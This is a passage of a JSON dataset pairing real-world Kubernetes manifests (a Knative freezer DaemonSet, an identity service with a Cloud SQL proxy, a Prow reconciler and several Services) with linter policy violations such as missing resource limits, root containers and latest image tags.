    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: freeze-daemon-containerd\n  namespace: knative-serving\nspec:\n  selector:\n    matchLabels:\n      name: freeze-daemon\n  template:\n    metadata:\n      labels:\n        name: freeze-daemon\n    spec:\n      serviceAccountName: freeze-tokenreview\n      containers:\n      - name: daemon\n        securityContext:\n          runAsUser: 0\n        image: ko://knative.dev/container-freezer/cmd/daemon\n        env:\n        - name: RUNTIME_TYPE\n          valueFrom:\n            configMapKeyRef:\n              name: freeze-configmap\n              key: runtime-type\n        - name: FREEZER_LOGGING_CONFIG\n          valueFrom:\n            configMapKeyRef:\n              name: freeze-configmap\n              key: freezer-logging-config\n        - name: FREEZER_LOGGING_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              name: freeze-configmap\n              key: freezer-logging-level\n        ports:\n        - containerPort: 8080\n          hostPort: 9696\n        volumeMounts:\n        - name: containerd-socket\n          mountPath: /var/run/containerd/containerd.sock\n      volumes:\n      - name: containerd-socket\n        hostPath:\n          path: /var/run/containerd/containerd.sock\n          type: Socket\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"daemon\" does not have a read-only root file system"
  },
  {
    "id": "7830",
    "manifest_path": "data/manifests/the_stack_sample/sample_2885.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: freeze-daemon-containerd\n  namespace: knative-serving\nspec:\n  selector:\n    matchLabels:\n      name: freeze-daemon\n  template:\n    metadata:\n      labels:\n        name: freeze-daemon\n    spec:\n      serviceAccountName: freeze-tokenreview\n      containers:\n      - name: daemon\n        securityContext:\n          runAsUser: 0\n        image: ko://knative.dev/container-freezer/cmd/daemon\n        env:\n        - name: RUNTIME_TYPE\n          valueFrom:\n            configMapKeyRef:\n              name: freeze-configmap\n              key: runtime-type\n        - name: FREEZER_LOGGING_CONFIG\n          valueFrom:\n            configMapKeyRef:\n              name: freeze-configmap\n              key: freezer-logging-config\n        - name: FREEZER_LOGGING_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              name: freeze-configmap\n              key: freezer-logging-level\n        ports:\n        - containerPort: 8080\n          hostPort: 9696\n        volumeMounts:\n        - name: containerd-socket\n          mountPath: /var/run/containerd/containerd.sock\n      volumes:\n      - name: containerd-socket\n        hostPath:\n          path: /var/run/containerd/containerd.sock\n          type: Socket\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"freeze-tokenreview\" not found"
  },
  {
    "id": "7831",
    "manifest_path": "data/manifests/the_stack_sample/sample_2885.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: freeze-daemon-containerd\n  namespace: knative-serving\nspec:\n  selector:\n    matchLabels:\n      name: freeze-daemon\n  template:\n    metadata:\n      labels:\n        name: freeze-daemon\n    spec:\n      serviceAccountName: freeze-tokenreview\n      containers:\n      - name: daemon\n        securityContext:\n          runAsUser: 0\n        image: ko://knative.dev/container-freezer/cmd/daemon\n        env:\n        - name: RUNTIME_TYPE\n          valueFrom:\n            configMapKeyRef:\n              name: freeze-configmap\n              key: runtime-type\n        - name: FREEZER_LOGGING_CONFIG\n          valueFrom:\n            configMapKeyRef:\n              name: freeze-configmap\n              key: freezer-logging-config\n        - name: FREEZER_LOGGING_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              name: freeze-configmap\n              key: freezer-logging-level\n        ports:\n        - containerPort: 8080\n          hostPort: 9696\n        volumeMounts:\n        - name: containerd-socket\n          mountPath: /var/run/containerd/containerd.sock\n      volumes:\n      - name: containerd-socket\n        hostPath:\n          path: /var/run/containerd/containerd.sock\n          type: Socket\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"daemon\" is not set to runAsNonRoot"
  },
  {
    "id": "7832",
    "manifest_path": "data/manifests/the_stack_sample/sample_2885.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: freeze-daemon-containerd\n  namespace: knative-serving\nspec:\n  selector:\n    matchLabels:\n      name: freeze-daemon\n  template:\n    metadata:\n      labels:\n        name: freeze-daemon\n    spec:\n      serviceAccountName: freeze-tokenreview\n      containers:\n      - name: daemon\n        securityContext:\n          runAsUser: 0\n        image: ko://knative.dev/container-freezer/cmd/daemon\n        env:\n        - name: RUNTIME_TYPE\n          valueFrom:\n            configMapKeyRef:\n              name: freeze-configmap\n              key: runtime-type\n        - name: FREEZER_LOGGING_CONFIG\n          valueFrom:\n            configMapKeyRef:\n              name: freeze-configmap\n              key: freezer-logging-config\n        - name: FREEZER_LOGGING_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              name: freeze-configmap\n              key: freezer-logging-level\n        ports:\n        - containerPort: 8080\n          hostPort: 9696\n        volumeMounts:\n        - name: containerd-socket\n          mountPath: /var/run/containerd/containerd.sock\n      volumes:\n      - name: containerd-socket\n        hostPath:\n          path: /var/run/containerd/containerd.sock\n          type: Socket\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"daemon\" has cpu request 0"
  },
  {
    "id": "7833",
    "manifest_path": "data/manifests/the_stack_sample/sample_2885.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: freeze-daemon-containerd\n  namespace: knative-serving\nspec:\n  selector:\n    matchLabels:\n      name: freeze-daemon\n  template:\n    metadata:\n      labels:\n        name: freeze-daemon\n    spec:\n      serviceAccountName: freeze-tokenreview\n      containers:\n      - name: daemon\n        securityContext:\n          runAsUser: 0\n        image: ko://knative.dev/container-freezer/cmd/daemon\n        env:\n        - name: RUNTIME_TYPE\n          valueFrom:\n            configMapKeyRef:\n              name: freeze-configmap\n              key: runtime-type\n        - name: FREEZER_LOGGING_CONFIG\n          valueFrom:\n            configMapKeyRef:\n              name: freeze-configmap\n              key: freezer-logging-config\n        - name: FREEZER_LOGGING_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              name: freeze-configmap\n              key: freezer-logging-level\n        ports:\n        - containerPort: 8080\n          hostPort: 9696\n        volumeMounts:\n        - name: containerd-socket\n          mountPath: /var/run/containerd/containerd.sock\n      volumes:\n      - name: containerd-socket\n        hostPath:\n          path: /var/run/containerd/containerd.sock\n          type: Socket\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"daemon\" has memory limit 0"
  },
  {
    "id": "7834",
    "manifest_path": "data/manifests/the_stack_sample/sample_2887.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: identity\n  labels:\n    service: identity\n    tier: backend\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      service: identity\n      tier: backend\n  template:\n    metadata:\n      labels:\n        service: identity\n        tier: backend\n    spec:\n      containers:\n      - name: identity\n        image: eu.gcr.io/chmsqrt2-truesparrow-common/identity:latest\n        ports:\n        - containerPort: 10001\n        livenessProbe:\n          httpGet:\n            path: /status/check\n            port: 10001\n          initialDelaySeconds: 30\n          periodSeconds: 10\n        readinessProbe:\n          httpGet:\n            path: /status/check\n            port: 10001\n        envFrom:\n        - configMapRef:\n            name: identity\n        env:\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: identity-secrets\n              key: POSTGRES_PASSWORD\n        - name: AUTH0_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: identity-secrets\n              key: AUTH0_CLIENT_SECRET\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:1.11\n        command:\n        - /cloud_sql_proxy\n        args:\n        - -instances=$(POSTGRES_CLOUDSQL_CONNECTION_NAME)=tcp:$(POSTGRES_PORT)\n        - -credential_file=/secrets/gcp-service-identity-key.json\n        envFrom:\n        - configMapRef:\n            name: identity\n        volumeMounts:\n        - name: secrets\n          mountPath: /secrets\n          readOnly: true\n      volumes:\n      - name: secrets\n        secret:\n          secretName: identity-secrets\n          items:\n          - key: SERVICE_IDENTITY_SERVICE_KEY\n            path: gcp-service-identity-key.json\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"identity\" is using an invalid container image, \"eu.gcr.io/chmsqrt2-truesparrow-common/identity:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7835",
    "manifest_path": "data/manifests/the_stack_sample/sample_2887.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: identity\n  labels:\n    service: identity\n    tier: backend\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      service: identity\n      tier: backend\n  template:\n    metadata:\n      labels:\n        service: identity\n        tier: backend\n    spec:\n      containers:\n      - name: identity\n        image: eu.gcr.io/chmsqrt2-truesparrow-common/identity:latest\n        ports:\n        - containerPort: 10001\n        livenessProbe:\n          httpGet:\n            path: /status/check\n            port: 10001\n          initialDelaySeconds: 30\n          periodSeconds: 10\n        readinessProbe:\n          httpGet:\n            path: /status/check\n            port: 10001\n        envFrom:\n        - configMapRef:\n            name: identity\n        env:\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: identity-secrets\n              key: POSTGRES_PASSWORD\n        - name: AUTH0_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: identity-secrets\n              key: AUTH0_CLIENT_SECRET\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:1.11\n        command:\n        - /cloud_sql_proxy\n        args:\n        - -instances=$(POSTGRES_CLOUDSQL_CONNECTION_NAME)=tcp:$(POSTGRES_PORT)\n        - -credential_file=/secrets/gcp-service-identity-key.json\n        envFrom:\n        - configMapRef:\n            name: identity\n        volumeMounts:\n        - name: secrets\n          mountPath: /secrets\n          readOnly: true\n      volumes:\n      - name: secrets\n        secret:\n          secretName: identity-secrets\n          items:\n          - key: SERVICE_IDENTITY_SERVICE_KEY\n            path: gcp-service-identity-key.json\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cloudsql-proxy\" does not have a read-only root file system"
  },
  {
    "id": "7836",
    "manifest_path": "data/manifests/the_stack_sample/sample_2887.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: identity\n  labels:\n    service: identity\n    tier: backend\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      service: identity\n      tier: backend\n  template:\n    metadata:\n      labels:\n        service: identity\n        tier: backend\n    spec:\n      containers:\n      - name: identity\n        image: eu.gcr.io/chmsqrt2-truesparrow-common/identity:latest\n        ports:\n        - containerPort: 10001\n        livenessProbe:\n          httpGet:\n            path: /status/check\n            port: 10001\n          initialDelaySeconds: 30\n          periodSeconds: 10\n        readinessProbe:\n          httpGet:\n            path: /status/check\n            port: 10001\n        envFrom:\n        - configMapRef:\n            name: identity\n        env:\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: identity-secrets\n              key: POSTGRES_PASSWORD\n        - name: AUTH0_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: identity-secrets\n              key: AUTH0_CLIENT_SECRET\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:1.11\n        command:\n        - /cloud_sql_proxy\n        args:\n        - -instances=$(POSTGRES_CLOUDSQL_CONNECTION_NAME)=tcp:$(POSTGRES_PORT)\n        - -credential_file=/secrets/gcp-service-identity-key.json\n        envFrom:\n        - configMapRef:\n            name: identity\n        volumeMounts:\n        - name: secrets\n          mountPath: /secrets\n          readOnly: true\n      volumes:\n      - name: secrets\n        secret:\n          secretName: identity-secrets\n          items:\n          - key: SERVICE_IDENTITY_SERVICE_KEY\n            path: gcp-service-identity-key.json\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"identity\" does not have a read-only root file system"
  },
  {
    "id": "7837",
    "manifest_path": "data/manifests/the_stack_sample/sample_2887.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: identity\n  labels:\n    service: identity\n    tier: backend\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      service: identity\n      tier: backend\n  template:\n    metadata:\n      labels:\n        service: identity\n        tier: backend\n    spec:\n      containers:\n      - name: identity\n        image: eu.gcr.io/chmsqrt2-truesparrow-common/identity:latest\n        ports:\n        - containerPort: 10001\n        livenessProbe:\n          httpGet:\n            path: /status/check\n            port: 10001\n          initialDelaySeconds: 30\n          periodSeconds: 10\n        readinessProbe:\n          httpGet:\n            path: /status/check\n            port: 10001\n        envFrom:\n        - configMapRef:\n            name: identity\n        env:\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: identity-secrets\n              key: POSTGRES_PASSWORD\n        - name: AUTH0_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: identity-secrets\n              key: AUTH0_CLIENT_SECRET\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:1.11\n        command:\n        - /cloud_sql_proxy\n        args:\n        - -instances=$(POSTGRES_CLOUDSQL_CONNECTION_NAME)=tcp:$(POSTGRES_PORT)\n        - -credential_file=/secrets/gcp-service-identity-key.json\n        envFrom:\n        - configMapRef:\n            name: identity\n        volumeMounts:\n        - name: secrets\n          mountPath: /secrets\n          readOnly: true\n      volumes:\n      - name: secrets\n        secret:\n          secretName: identity-secrets\n          items:\n          - key: SERVICE_IDENTITY_SERVICE_KEY\n            path: gcp-service-identity-key.json\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cloudsql-proxy\" is not set to runAsNonRoot"
  },
  {
    "id": "7838",
    "manifest_path": "data/manifests/the_stack_sample/sample_2887.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: identity\n  labels:\n    service: identity\n    tier: backend\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      service: identity\n      tier: backend\n  template:\n    metadata:\n      labels:\n        service: identity\n        tier: backend\n    spec:\n      containers:\n      - name: identity\n        image: eu.gcr.io/chmsqrt2-truesparrow-common/identity:latest\n        ports:\n        - containerPort: 10001\n        livenessProbe:\n          httpGet:\n            path: /status/check\n            port: 10001\n          initialDelaySeconds: 30\n          periodSeconds: 10\n        readinessProbe:\n          httpGet:\n            path: /status/check\n            port: 10001\n        envFrom:\n        - configMapRef:\n            name: identity\n        env:\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: identity-secrets\n              key: POSTGRES_PASSWORD\n        - name: AUTH0_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: identity-secrets\n              key: AUTH0_CLIENT_SECRET\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:1.11\n        command:\n        - /cloud_sql_proxy\n        args:\n        - -instances=$(POSTGRES_CLOUDSQL_CONNECTION_NAME)=tcp:$(POSTGRES_PORT)\n        - -credential_file=/secrets/gcp-service-identity-key.json\n        envFrom:\n        - configMapRef:\n            name: identity\n        volumeMounts:\n        - name: secrets\n          mountPath: /secrets\n          readOnly: true\n      volumes:\n      - name: secrets\n        secret:\n          secretName: identity-secrets\n          items:\n          - key: SERVICE_IDENTITY_SERVICE_KEY\n            path: gcp-service-identity-key.json\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"identity\" is not set to runAsNonRoot"
  },
  {
    "id": "7839",
    "manifest_path": "data/manifests/the_stack_sample/sample_2887.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: identity\n  labels:\n    service: identity\n    tier: backend\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      service: identity\n      tier: backend\n  template:\n    metadata:\n      labels:\n        service: identity\n        tier: backend\n    spec:\n      containers:\n      - name: identity\n        image: eu.gcr.io/chmsqrt2-truesparrow-common/identity:latest\n        ports:\n        - containerPort: 10001\n        livenessProbe:\n          httpGet:\n            path: /status/check\n            port: 10001\n          initialDelaySeconds: 30\n          periodSeconds: 10\n        readinessProbe:\n          httpGet:\n            path: /status/check\n            port: 10001\n        envFrom:\n        - configMapRef:\n            name: identity\n        env:\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: identity-secrets\n              key: POSTGRES_PASSWORD\n        - name: AUTH0_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: identity-secrets\n              key: AUTH0_CLIENT_SECRET\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:1.11\n        command:\n        - /cloud_sql_proxy\n        args:\n        - -instances=$(POSTGRES_CLOUDSQL_CONNECTION_NAME)=tcp:$(POSTGRES_PORT)\n        - -credential_file=/secrets/gcp-service-identity-key.json\n        envFrom:\n        - configMapRef:\n            name: identity\n        volumeMounts:\n        - name: secrets\n          mountPath: /secrets\n          readOnly: true\n      volumes:\n      - name: secrets\n        secret:\n          secretName: identity-secrets\n          items:\n          - key: SERVICE_IDENTITY_SERVICE_KEY\n            path: gcp-service-identity-key.json\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cloudsql-proxy\" has cpu request 0"
  },
  {
    "id": "7840",
    "manifest_path": "data/manifests/the_stack_sample/sample_2887.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: identity\n  labels:\n    service: identity\n    tier: backend\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      service: identity\n      tier: backend\n  template:\n    metadata:\n      labels:\n        service: identity\n        tier: backend\n    spec:\n      containers:\n      - name: identity\n        image: eu.gcr.io/chmsqrt2-truesparrow-common/identity:latest\n        ports:\n        - containerPort: 10001\n        livenessProbe:\n          httpGet:\n            path: /status/check\n            port: 10001\n          initialDelaySeconds: 30\n          periodSeconds: 10\n        readinessProbe:\n          httpGet:\n            path: /status/check\n            port: 10001\n        envFrom:\n        - configMapRef:\n            name: identity\n        env:\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: identity-secrets\n              key: POSTGRES_PASSWORD\n        - name: AUTH0_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: identity-secrets\n              key: AUTH0_CLIENT_SECRET\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:1.11\n        command:\n        - /cloud_sql_proxy\n        args:\n        - -instances=$(POSTGRES_CLOUDSQL_CONNECTION_NAME)=tcp:$(POSTGRES_PORT)\n        - -credential_file=/secrets/gcp-service-identity-key.json\n        envFrom:\n        - configMapRef:\n            name: identity\n        volumeMounts:\n        - name: secrets\n          mountPath: /secrets\n          readOnly: true\n      volumes:\n      - name: secrets\n        secret:\n          secretName: identity-secrets\n          items:\n          - key: SERVICE_IDENTITY_SERVICE_KEY\n            path: gcp-service-identity-key.json\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"identity\" has cpu request 0"
  },
  {
    "id": "7841",
    "manifest_path": "data/manifests/the_stack_sample/sample_2887.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: identity\n  labels:\n    service: identity\n    tier: backend\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      service: identity\n      tier: backend\n  template:\n    metadata:\n      labels:\n        service: identity\n        tier: backend\n    spec:\n      containers:\n      - name: identity\n        image: eu.gcr.io/chmsqrt2-truesparrow-common/identity:latest\n        ports:\n        - containerPort: 10001\n        livenessProbe:\n          httpGet:\n            path: /status/check\n            port: 10001\n          initialDelaySeconds: 30\n          periodSeconds: 10\n        readinessProbe:\n          httpGet:\n            path: /status/check\n            port: 10001\n        envFrom:\n        - configMapRef:\n            name: identity\n        env:\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: identity-secrets\n              key: POSTGRES_PASSWORD\n        - name: AUTH0_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: identity-secrets\n              key: AUTH0_CLIENT_SECRET\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:1.11\n        command:\n        - /cloud_sql_proxy\n        args:\n        - -instances=$(POSTGRES_CLOUDSQL_CONNECTION_NAME)=tcp:$(POSTGRES_PORT)\n        - -credential_file=/secrets/gcp-service-identity-key.json\n        envFrom:\n        - configMapRef:\n            name: identity\n        volumeMounts:\n        - name: secrets\n          mountPath: /secrets\n          readOnly: true\n      volumes:\n      - name: secrets\n        secret:\n          secretName: identity-secrets\n          items:\n          - key: SERVICE_IDENTITY_SERVICE_KEY\n            path: gcp-service-identity-key.json\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cloudsql-proxy\" has memory limit 0"
  },
  {
    "id": "7842",
    "manifest_path": "data/manifests/the_stack_sample/sample_2887.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: identity\n  labels:\n    service: identity\n    tier: backend\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      service: identity\n      tier: backend\n  template:\n    metadata:\n      labels:\n        service: identity\n        tier: backend\n    spec:\n      containers:\n      - name: identity\n        image: eu.gcr.io/chmsqrt2-truesparrow-common/identity:latest\n        ports:\n        - containerPort: 10001\n        livenessProbe:\n          httpGet:\n            path: /status/check\n            port: 10001\n          initialDelaySeconds: 30\n          periodSeconds: 10\n        readinessProbe:\n          httpGet:\n            path: /status/check\n            port: 10001\n        envFrom:\n        - configMapRef:\n            name: identity\n        env:\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: identity-secrets\n              key: POSTGRES_PASSWORD\n        - name: AUTH0_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: identity-secrets\n              key: AUTH0_CLIENT_SECRET\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:1.11\n        command:\n        - /cloud_sql_proxy\n        args:\n        - -instances=$(POSTGRES_CLOUDSQL_CONNECTION_NAME)=tcp:$(POSTGRES_PORT)\n        - -credential_file=/secrets/gcp-service-identity-key.json\n        envFrom:\n        - configMapRef:\n            name: identity\n        volumeMounts:\n        - name: secrets\n          mountPath: /secrets\n          readOnly: true\n      volumes:\n      - name: secrets\n        secret:\n          secretName: identity-secrets\n          items:\n          - key: SERVICE_IDENTITY_SERVICE_KEY\n            path: gcp-service-identity-key.json\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"identity\" has memory limit 0"
  },
  {
    "id": "7843",
    "manifest_path": "data/manifests/the_stack_sample/sample_2888.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: vamsicoswpythonflaskdocker\nspec:\n  type: LoadBalancer\n  ports:\n  - port: 8080\n  selector:\n    app: vamsicoswpythonflaskdocker\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:vamsicoswpythonflaskdocker])"
  },
  {
    "id": "7844",
    "manifest_path": "data/manifests/the_stack_sample/sample_2889.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: traefik-service\n  namespace: kube-public\nspec:\n  type: NodePort\n  selector:\n    app: traefik\n  ports:\n  - port: 80\n    nodePort: 30021\n    targetPort: 80\n    protocol: TCP\n    name: http\n  - port: 8080\n    nodePort: 30042\n    targetPort: 8080\n    protocol: TCP\n    name: admin\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:traefik])"
  },
  {
    "id": "7845",
    "manifest_path": "data/manifests/the_stack_sample/sample_2890.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app.kubernetes.io/part-of: prow\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20200628-cc1c099dad\n        imagePullPolicy: Always\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --continue-on-error=true\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --job-config-path=/etc/job-config\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"statusreconciler\" does not have a read-only root file system"
  },
  {
    "id": "7846",
    "manifest_path": "data/manifests/the_stack_sample/sample_2890.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app.kubernetes.io/part-of: prow\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20200628-cc1c099dad\n        imagePullPolicy: Always\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --continue-on-error=true\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --job-config-path=/etc/job-config\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"statusreconciler\" is not set to runAsNonRoot"
  },
  {
    "id": "7847",
    "manifest_path": "data/manifests/the_stack_sample/sample_2890.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app.kubernetes.io/part-of: prow\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20200628-cc1c099dad\n        imagePullPolicy: Always\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --continue-on-error=true\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --job-config-path=/etc/job-config\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"statusreconciler\" has cpu request 0"
  },
  {
    "id": "7848",
    "manifest_path": "data/manifests/the_stack_sample/sample_2890.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app.kubernetes.io/part-of: prow\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20200628-cc1c099dad\n        imagePullPolicy: Always\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --continue-on-error=true\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --job-config-path=/etc/job-config\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"statusreconciler\" has memory limit 0"
  },
  {
    "id": "7849",
    "manifest_path": "data/manifests/the_stack_sample/sample_2893.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes15\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n  securityContext:\n    runAsNonRoot: true\n  volumes:\n  - azureDisk:\n      diskName: test\n      diskURI: https://test.blob.core.windows.net/test/test.vhd\n    name: volume1\n",
    "policy_id": "latest-tag",
